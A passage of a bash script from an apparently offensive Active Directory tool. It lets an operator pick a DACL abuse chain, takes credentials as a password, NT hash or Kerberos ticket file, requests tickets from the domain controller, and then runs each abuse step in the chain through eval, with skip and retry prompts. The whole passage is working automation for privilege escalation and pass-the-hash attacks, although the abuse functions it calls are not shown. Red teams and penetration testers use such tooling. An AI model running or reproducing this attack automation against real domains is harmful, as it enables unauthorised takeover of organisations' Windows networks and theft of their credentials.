        printf "%2d) %s\n" $((i+1)) "${all_chains[i]}"
    done
fi

# Selection menu
selected_chains=()
while true; do
    echo -e "\n${YELLOW}[?] Choose DACL Chain to Exploit:${NC}"
    read -p "Select a chain number (1-${#all_chains[@]}) or 0 to exit: " choice
    
    if [[ "$choice" =~ ^[0-9]+$ ]]; then
        if (( choice >= 1 && choice <= ${#all_chains[@]} )); then
            selected_chain="${all_chains[choice-1]}"
            selected_chains=("$selected_chain")
            echo -e "\nSelected Chain $choice:"
            echo -e "$selected_chain\n"
            
            # Extract the starting node for authentication
            start_node=$(echo -e "$selected_chain" | awk -F' ---' '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')
            start_node_type=$(color_to_obj "$(echo -e "$selected_chain" | awk -F' ---' '{print $1}')")
            
            echo -e "[*] Starting node: $start_node ($start_node_type)"
            
            # Handle authentication based on starting node type
            if [[ "$start_node_type" == "Group" ]]; then
                while true; do
                    read -erp "${YELLOW}[?] Input credentials for a member of $start_node (USER:PASS / USER:HASH / USER:TGT_FILE): ${NC}" credentials </dev/tty
                    creds=$(echo $credentials | awk -F":" '{print $2}')
                    creds_src=$(echo $credentials | awk -F":" '{print $1}')

                    if [[ "$creds" =~ ^[a-fA-F0-9]{32}$ ]]; then
                        get_ticket $DC_FQDN -u $creds_src -H $creds
                        if [ $? -eq 0 ]; then 
                            AUTH_USER="$creds_src"
                            break
                        fi
                    elif [[ -s $creds ]]; then
                        cp $creds "./${creds_src^^}.ccache"
                        export KRB5CCNAME="$creds"
                        klist
                        AUTH_USER="$creds_src"
                        break
                    else
                        get_ticket $DC_FQDN -u $creds_src -p $creds
                        if [ $? -eq 0 ]; then 
                            AUTH_USER="$creds_src"
                            break
                        fi
                    fi
                    
                    echo -e "[-] Authentication failed. Please check your credentials and try again.\n"
                done
            else
                # For non-group starting nodes, use the node itself
                AUTH_USER="$start_node"
                authenticate_user $AUTH_USER $DC_FQDN
            fi
            
            echo -e "\n${GREEN}[+] Authentication successful for: $AUTH_USER${NC}"
            break
            
        elif (( choice == 0 )); then
            echo -e "Exiting..."
            exit 0
        else
            echo -e "[-] Invalid option. Please try again.\n"
        fi
    else
        echo -e "Please enter a valid number."
    fi
done

# Proceed with exploitation
echo -e "\nProceeding with exploitation..."
for chain in "${selected_chains[@]}"; do
    # Initialize
    prev_src=""
    prev_abuse=""
    prev_source_type=""

    echo "$chain" | \
    awk -F ' ---|--> ' '{
        for (i=2; i<=NF; i+=2) {
            abuse = $i;
            source = $(i-1);
            target = $(i+1);
            printf "%s \"%s\" \"%s\"\n", abuse, source, target;
        }
    }' | \
    
    while read -r cmd; do
        source=$(echo "$cmd" | awk -F'"' '{print $2}')
        source_type=$(color_to_obj "$source")
        type=$(color_to_obj "$(echo "$cmd" | awk -F'"' '{print $4}')")  # Changed from $3 to $4
        abuse=$(echo "$cmd" | awk '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')

        if [[ "$prev_abuse" == "MemberOf" && "$prev_source_type" == "User" ]]; then
            SRC="$prev_src"
        elif [[ "$source_type" == "Group" && "$prev_abuse" != "MemberOf" ]]; then
            authenticate_group_member $source $DC_FQDN
        else
            SRC="$source"
        fi

        # Store current values for next iteration
        prev_abuse="$abuse"
        prev_src="$SRC"
        prev_source_type="$source_type"

        # Execute the command
        echo "$abuse $DC_FQDN \"$(echo "$SRC" | sed 's/\x1B\[[0-9;]*[mGK]//g')\" \"$(echo "$cmd" | awk -F"\"" '{print $4}' | sed 's/\x1B\[[0-9;]*[mGK]//g')\" $type" | sed 's/\x1B\[[0-9;]*[mGK]//g' | \
        while read -r exec_cmd; do
            # Rest of your execution logic
            # Execute the command and capture the exit status
            eval "$exec_cmd"
            exit_status=$?

            # Check if the command failed (non-zero exit status)
            if [ $exit_status -ne 0 ]; then
                echo -e "\n${RED}[!] $abuse failed${NC}" >/dev/tty

                # Prompt user for action
                while true; do
                    read -p "[?] Do you want to (S)kip or (R)etry? [S/R]: " choice </dev/tty
                    case "$choice" in
                        [Ss]* ) 
                            echo -e "[~] Skipping to next command..." >/dev/tty
                            break  # Exit the retry loop, proceed to next command
                            ;;
                        [Rr]* ) 
                            echo -e "[~] Retrying..." >/dev/tty
                            if eval "$exec_cmd"; then  # This automatically checks for exit status 0
                                break  # Success, proceed to next command
                            fi
                            ;;
                        * ) 
                            echo -e "[!] Invalid choice. Please enter S (Skip) or R (Retry)." >/dev/tty
                            ;;
                    esac
                done
            fi
        done
    done
done


